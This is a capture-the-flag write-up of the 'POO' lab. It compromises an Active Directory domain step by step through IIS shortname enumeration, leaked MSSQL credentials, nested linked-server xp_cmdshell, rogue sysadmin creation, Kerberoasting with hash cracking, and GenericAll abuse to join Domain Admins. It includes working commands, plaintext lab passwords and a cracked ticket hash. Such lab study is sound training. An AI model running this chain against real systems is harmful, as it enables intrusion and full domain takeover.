After find the DS_store file in nikto I made use of the msfconsole and used the following scanner as some iis servers are vulnerable to file enum.

```shell
msf6 auxiliary(scanner/http/iis_shortname_scanner) > run
[*] Running module against 10.13.38.11

[*] Scanning in progress...
[+] Found 5 directories
[+] http://10.13.38.11/newfol*~1
[+] http://10.13.38.11/newfol*~2
[+] http://10.13.38.11/ds_sto*~1
[+] http://10.13.38.11/templa*~1
[+] http://10.13.38.11/trashe*~1
[+] Found 1 files
[+] http://10.13.38.11/web*~1.con*
[*] Auxiliary module execution completed


```

Using the other directories found with DS_walk we got an interesting file
```shell
http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co*~1.txt*

```

Then I wrote a little script to find the correct file:
```python
import requests

# Base URL and pattern from the .DS_Store file
base_url = "http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co"
wordlist = "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"  # Path to your wordlist
file_extension = ".txt"

# Read the wordlist and filter for words starting with 'co'
with open(wordlist, 'r') as file:
    lines = file.readlines()
    words = [line.strip() for line in lines if line.startswith('co')]

# Check each URL
for word in words:
    url = f"{base_url}{word}{file_extension}"
    response = requests.get(url)
    if response.status_code == 200:
        print(f"Found valid file: {url}")
        break

# Make sure to replace "/path/to/your/wordlist.txt" with the path to your actual wordlist.
# The script assumes that the wordlist contains possible completions for the filename,
# starting with 'co' and not including the file extension.
Found valid file: poo_connection.txt
```
```
SERVER=10.13.38.11
USERID=external_user
DBNAME=POO_PUBLIC
USERPWD=#p00Public3xt3rnalUs3r#

Flag : POO{fcfb0767f5bd3cbc22f40ff5011ad555}

```

Using the above creds I was able to log into the mssql server
```shell
mssqlclient.py -p 1433 external_user@10.13.38.11
```

# Multiple Linked Servers
After Identifying that the POO_CONFIG server was linked to the server that was joined first it then became apparent that the POO_PUBLIC server was linked to the POO_CONFIG.

The user on the POO_PUBLIC Server was able to enable xp_cmdshell

```shell
SQL (external_user  external_user@master)> EXEC ('EXEC (''xp_cmdshell ''''whoami'''';'') AT [COMPATIBILITY\POO_PUBLIC];') AT [COMPATIBILITY\POO_CONFIG];
output                        
---------------------------   
nt service\mssql$poo_public   

NULL                          

```

Trying to get a reverse shell did not work so moving onto creating a new super user

# Super MSSQL User
```sql 
EXEC ('EXEC (''EXEC sp_addlogin ''''super'''', ''''abc123!'''''') at[COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];

EXEC ('EXEC (''EXEC sp_addsrvrolemember ''''super'''', ''''sysadmin'''''') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];

mssqlclient.py -p 1433 super@10.13.38.11
Impacket v0.12.0.dev1+20240327.181547.f8899e65 - Copyright 2023 Fortra

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 1: Changed database context to 'master'.
[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 7235) 
[!] Press help for extra shell commands
SQL (super  dbo@master)> 

SQL (super  dbo@master)> select name from master.dbo.sysdatabases
name         
----------   
master       

tempdb       

model        

msdb         

POO_PUBLIC   

flag         

SQL (super  dbo@master)> use flag
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: flag
[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 1: Changed database context to 'flag'.

SQL (super  dbo@flag)> Select * from flag;
flag                                       
----------------------------------------   
b'POO{88d829eb39f2d11697e689d779810d42}'  

```

Using this we can access the web.config. This article helped
https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server

```shell
SQL (super  dbo@flag)> EXEC sp_execute_external_script @language = N'Python', @script = N'import os; os.system("type C:\inetpub\wwwroot\web.config");';
[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 0: STDOUT message(s) from external script: 
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <staticContent>
            <mimeMap
                fileExtension=".DS_Store"
                mimeType="application/octet-stream"
            />
        </staticContent>
        <!--
        <authentication mode="Forms">
            <forms name="login" loginUrl="/admin">
                <credentials passwordFormat = "Clear">
                    <user 
                        name="Administrator" 
                        password="EverybodyWantsToWorkAtP.O.O."
                    />
                </credentials>
            </forms>
        </authentication>
        -->
    </system.webServer>
</configuration>


```

# IPv6 -> WinRM -> Bloodhound

Connect with evil-winrm and upload sharphound to the public folder. Then you have to run it with the mssql service account as the admin cannot. Download the data and put it into bloodhound
## SharpHound command
```shell
SQL (super  dbo@master)> xp_cmdshell "C:\Users\Public\SharpHound.exe -C All --outputdirectory C:\Users\Public"

```

The p00_adm user is the target since he in the group with genericAll rights.

# Kerberoasting
```shell
xp_cmdshell "C:\Users\Public\Rubeus.exe kerberoast /user:P00_ADM /domain:intranet.poo /outfile:C:\Users\Public\hashes.txt"

```
## Crack the Hash
```shell
hashcat -m 13100 hashes.txt /usr/share/wordlists/SecLists/Passwords/Keyboard-Walks/.

$krb5tgs$23$*p00_adm$intranet.poo$cyber_audit/intranet.poo:443@intranet.poo*$f10933df0210b19c36319f52d1d0ecae$ab8c861fa36ecf5969d10d9d74be8c9fe3616552b3cc2b52758adad92bf530a076296e282881aa4aabb987882d7a693172acb0dbad15036ce75db32cf647609c0beeec3e02d3a217b9ba6f9fbb88110cd8229e74dcb8ff7abd2b817dd970dfa4313f5f494a6394d9f23fe238de2be89ef8391ac29e9ddf4569f1502a2e611961c5e104f3552cbc362a02e5b783d19e66f7fdb816fcec5f67d91a647419e598c94466d1101a9e04124f5b87aaedb1c89fee8260450984a5691705c35face5de884a5ad9cc279967b6e9a922c730ca728331177f00d1dc21ebe6b995927a89b65ab2782ef369f33a7fcc967376bbabfd9d7e8639eb8cf2d54ead89b08b8c7741bde1e244e5c2858cc9701f8ae6b072c67cd6a2620840506266d0e00b58fbabe68b3a955170f42c6e3ac6555d0d4f503ff76285fa2585e6584e9d4199fedc054d27b52b638257c9997f2438707e7b4b45bf97f6806df6416d248009e679854d52f46d5cfd6da87efd24721dba2515ff0c73a898b4066b71505e618d50a59d928368f2da2d2b9a657e74f67e12cd821587a69256ac92e694cef35609a374f5a406f47277e2782c2f7c9bb6503394d9d7b06646c272b542b66b976aeed73eb5f7f54d72898c00c77dd35998a3879ac79fa665ee6788604b20becb71b22c45eaa4d5b0354e278a8a22ca9f9974a3938144ea930752ddf43672e3c348c3873bda07769d53a87a6d3e9777477ad38d690588436da22a352486a573142f98e4384ad8f1fee9d0cff9221150cb2eec8fcab02be21163770f755da4f04cf367017fe379a276a28a677ac97f35e7a405c350e889526c2989f15a2d61413d9b30d6575482261a56ca70db780186d6ec99c108c06049ec432bba340c158da5a8d01c34f179ce971e66bcd99f1089ab2e7af3c7f97afd1068549425d8f8fdd0b286aac8acb9d79507704fbc2b476619e3eb011326cda29d3240ae2b8c89f6fb95566b37a3067b20ea952a14b23c1ea3e63f74e58f50d9b2b07bf50d15f70c98311c7f8adbf6099b5d658ddbe473204fbcab4c14a66e854cd728c22ef773ad06482da881b2b3c166402486d380554f9adb43d076e112796fd031c528536511139767c77876a43f977c39c9a8041a62d26bb0933b2a4985da4aa3ec81462aad032684dc69396c415511d732fd7503390d1c0c4cd0456d25a8d7eb501e9e9f8a54dbd7ed1abf3d5f1aa5de91183a7622994a02d3ec19168f99d6c773d436d5f9a89fc9af3ac0b689236923a6399ad064dc9ffd103ae4fd03cfb365a179ff2778ae2ff7381d72bfd2e9bddf8489eb58876ff14d1587080ebf02dc248e6b7582e53806723e34bb53403ed12702b1b6deb9ece41a8314223f06aec289dae4a575cfc7177ec886999927c7bdb8f7b7d8fa632cddf137765f7ce1d3c9e8b2b792cac234f9b8528723f0ea4bd5995855272b2bd9533f4ea1e5996930798250a658ad57d61674af0c31:ZQ!5t4r

```

# Abusing the GenericAll
```shell
evil-winrm -i poo -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.' -s . 

Evil-WinRM* PS C:\Users\Public> menu
*Evil-WinRM* PS C:\Users\Public> Bypass-4MSI
*Evil-WinRM* PS C:\Users\Public> PowerView.ps1
*Evil-WinRM* PS C:\Users\Administrator\Documents> PowerView.ps1

*Evil-WinRM* PS C:\Users\Administrator\Documents> $SecPassword = ConvertTo-SecureString 'ZQ!5t4r' -AsPlainText -Force

*Evil-WinRM* PS C:\Users\Administrator\Documents> $Cred = New-Object System.Management.Automation.PSCredential('intranet.poo\p00_adm', $SecPassword)

*Evil-WinRM* PS C:\Users\Administrator\Documents> Add-DomainGroupMember -Identity 'Domain Admins' -Members 'p00_adm' -Credential $Cred

*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-DomainUser p00_adm -Credential $cred


logoncount                    : 6
badpasswordtime               : 4/19/2024 7:26:12 PM
distinguishedname             : CN=p00_adm,CN=Users,DC=intranet,DC=poo
objectclass                   : {top, person, organizationalPerson, user}
lastlogontimestamp            : 4/19/2024 7:26:37 PM
name                          : p00_adm
objectsid                     : S-1-5-21-2413924783-1155145064-2969042445-1107
samaccountname                : p00_adm
logonhours                    : {255, 255, 255, 255...}
codepage                      : 0
samaccounttype                : USER_OBJECT
accountexpires                : 1/1/1601 2:00:00 AM
countrycode                   : 0
whenchanged                   : 4/19/2024 4:26:37 PM
instancetype                  : 4
objectguid                    : 3a04555f-c783-4b22-afeb-28ac72154842
lastlogon                     : 4/19/2024 7:40:10 PM
lastlogoff                    : 1/1/1601 2:00:00 AM
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=intranet,DC=poo
dscorepropagationdata         : 1/1/1601 12:00:00 AM
serviceprincipalname          : cyber_audit/intranet.poo:443
memberof                      : {CN=P00 Help Desk,CN=Users,DC=intranet,DC=poo, CN=Domain Admins,CN=Users,DC=intranet,DC=poo}
whencreated                   : 3/21/2018 7:07:23 PM
badpwdcount                   : 0
cn                            : p00_adm
useraccountcontrol            : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usncreated                    : 25722
primarygroupid                : 513
pwdlastset                    : 5/11/2018 6:26:14 AM
msds-supportedencryptiontypes : 0
usnchanged                    : 143552




```

The output confirms that we're a member of Domain Admins. The Invoke-Command cmdlet can be used to execute commands on the DC.

```shell
Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Command -Computer DC -Credential $cred -ScriptBlock { whoami; hostname }
poo\p00_adm
DC
*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Command -Computer DC -Credential $cred -ScriptBlock { gci -recurse C:\Users flag.txt }

```